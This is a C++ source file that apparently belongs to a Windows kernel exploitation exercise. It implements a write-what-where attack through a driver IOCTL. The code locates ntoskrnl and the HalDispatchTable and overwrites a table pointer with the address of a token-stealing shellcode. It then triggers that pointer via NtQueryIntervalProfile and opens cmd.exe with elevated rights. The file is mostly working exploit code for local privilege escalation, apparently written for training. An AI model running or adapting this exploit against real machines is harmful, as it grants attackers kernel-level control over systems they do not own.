#include <Windows.h>
#include <iostream>

#include "string.h"
#include "Solutions.h"
#include "ioctal_codes.h"
#include "utils.h"

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG Count;
	SYSTEM_MODULE_ENTRY Modules[1]; // ntoskrnl is the first entry
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(
	IN			 SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT			 PVOID					  SystemInformation,
	IN			 ULONG				 	  SystemInformationLEngth,
	OUT OPTIONAL PULONG					  ReturnLength
	);

typedef NTSTATUS(WINAPI* pNtQueryIntervalProfile)(
	IN PULONG neverMind,
	OUT PULONG neverMind2
	);

PVOID getHalDispatchTableAddr();

NTSTATUS Solutions::TriggerWriteWhatWhere() {
	// overwrite the second pointer in the HalDispatchTable with shellcode address 

	DWORD dwBufSize = 8;
	ULONG where = (ULONG)getHalDispatchTableAddr() + 4; // second entry
	if (!(where - 4)) {
		std::cout << "[-] Failed getting halDispatchTable address" << std::endl;
		return 1;
	}

	ULONG pTokenStealingShellcode = (ULONG)(token_stealing_shellcode_write_what_where);
	ULONG what = (ULONG)(&pTokenStealingShellcode);
	PUCHAR lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize);
	DWORD dwBytesReturned = 0;

	if (!lpInBuffer) {
		std::cout << "[-] Could not allocate buffer :(" << std::endl;
		return 1;
	}

	std::cout << "[+] Allocated buffer with " << dwBufSize << " bytes" << std::endl;

	*(PULONG)lpInBuffer = what;
	*(PULONG)(lpInBuffer + sizeof(ULONG)) = where;

	if (!DeviceIoControl(_hDeviceHandle, IOCTL_WRITE_WHAT_WHERE, lpInBuffer, dwBufSize,
						NULL, NULL, &dwBytesReturned, NULL)) {
		std::cout << "[-] Could not interact with the driver :(" << std::endl;
		HeapFree(GetProcessHeap(), NULL, lpInBuffer);
		return 1;
	}

	std::cout << "[+] Succsfully talked with the driver" << std::endl;

	HMODULE ntdll = GetModuleHandle(L"ntdll");
	auto query = (pNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");
	ULONG a = 1;
	query((PULONG)0xdeadbeef, &a);

	system("cmd.exe");

	return 0;
}

static PVOID getHalDispatchTableAddr() {
	ULONG modulesLength = 0;
	PSYSTEM_MODULE_INFORMATION pModuleInfo = NULL;

	HMODULE ntdll = GetModuleHandle(L"ntdll");
	auto query = (pNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");

	query(SystemModuleInformation, NULL, NULL, &modulesLength);
	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, modulesLength);
	if (!pModuleInfo) {
		std::cout << "[-] could not allocate buffer for modules" << std::endl;
		return NULL;
	}

	query(SystemModuleInformation, (PVOID)pModuleInfo, modulesLength, NULL);
	if (!modulesLength) {
		std::cout << "[-] Failed retriving modules information" << std::endl;
		return NULL;
	}

	PVOID ntoskrnlBase = 0;
	ULONG ntoskrnlOffset = 0;
	PCHAR ntoskrnlFullPath = 0;
	for (int i = 0; i < pModuleInfo->Count; i++) {
		if (!strcmp((const char*)pModuleInfo->Modules[i].FullPathName + pModuleInfo->Modules[i].OffsetToFileName, "ntoskrnl.exe")) {
			ntoskrnlBase = pModuleInfo->Modules[i].ImageBase;
		}
	}
	HeapFree(GetProcessHeap(), NULL, pModuleInfo);

	if (ntoskrnlBase == 0) {
		std::cout << "[-] Could not found ntoskrnl.exe module" << std::endl;
		return NULL;
	}

	std::cout << "[+] ntoskrnl image base " << std::hex << ntoskrnlBase << std::endl;
	
	HMODULE hNtoskrnl = LoadLibrary(L"ntoskrnl.exe");
	if (!hNtoskrnl) {
		std::cout << "[-] could not load library ntoskrnl.exe - " << GetLastError() << std::endl;
		return NULL;
	}

	PVOID pHalUserLand = GetProcAddress(hNtoskrnl, "HalDispatchTable");
	if (!pHalUserLand) {
		std::cout << "[-] could not get halDispatchTable addres" << std::endl;
		return NULL;
	}
	std::cout << "[+] HalDispatchTable usermode address: " << std::hex << pHalUserLand << std::endl;
	
	PVOID HalDispatchTable = (PVOID)((ULONG)pHalUserLand - (ULONG)hNtoskrnl + (ULONG)ntoskrnlBase);
	std::cout << "[+] HalDispatchTable kernelmode address: " << std::hex << (ULONG)HalDispatchTable << std::endl;
	
	return HalDispatchTable;
}